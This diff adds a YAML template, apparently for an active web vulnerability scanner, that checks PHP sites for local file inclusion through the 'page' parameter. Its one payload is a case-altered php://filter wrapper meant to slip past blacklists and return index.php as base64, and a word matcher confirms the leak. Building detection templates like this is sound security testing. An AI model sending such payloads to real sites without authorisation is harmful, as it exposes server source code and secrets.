@@ -1,0 +1,22 @@
+id: patt-lfi-wrap-filter-02-page
+name: 'PATT lfi patt-lfi-wrap-filter-02 via page'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+  - wrapperphp
+requires:
+  - php
+description: 'PATT wrapper case-bypass when php://filter diblacklist. [patt:patt-lfi-wrap-filter-02] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Wrappers.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - 'pHp://FilTer/convert.base64-encode/resource=index.php'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
